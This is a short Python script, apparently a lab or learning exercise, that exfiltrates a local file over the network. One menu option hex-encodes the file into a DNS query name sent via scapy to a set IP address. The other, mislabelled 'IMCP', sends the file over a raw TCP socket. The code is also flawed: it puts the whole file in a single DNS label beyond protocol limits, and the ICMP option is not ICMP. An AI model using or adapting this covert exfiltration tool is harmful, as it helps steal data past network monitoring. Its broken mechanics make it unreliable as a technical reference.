import socket
from scapy.all import DNS, DNSQR, IP, send, UDP
import binascii

def display_menu():
    print("1. Send a file by DNS ")
    print("2. Send a file by IMCP ")
    print("3. Exit ")

def file_to_hex(file_path):
    with open(file_path, 'rb') as file:
        binary_data = file.read()
    return binascii.hexlify(binary_data).decode()
# print(hex_data)

def send_file_dns(server_ip, file_path):

    # Open the file in binary mode
    with open(file_path, 'rb') as file:
        hex_data = file_to_hex(file_path)
        file_data = hex_data
        # file_data = file.read()

    # Encode the file data into a domain name
    domain = file_data + '.example.com'

    # Create a DNS query with the domain name
    packet = IP(dst=server_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=domain))

    # Send the packet
    send(packet)


def main():
    while True:
        display_menu()
        choice = input("Enter your choice: ")
        if choice == "1":
            send_file_dns('192.168.1.1', 'file.txt')
        elif choice == "2":
            send_file_imcp('localhost', 'file.txt')

        elif choice == "3":
            print("Exit")
            break
        else:
            print("Invalid choice")


def send_file_imcp(server_ip, file_path):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    client_socket.connect((server_ip, 12345))

    # Open the file in binary mode and send its contents
    with open(file_path, 'rb') as file:
        client_socket.sendall(file.read())

    # Close the connection
    client_socket.close()


main()
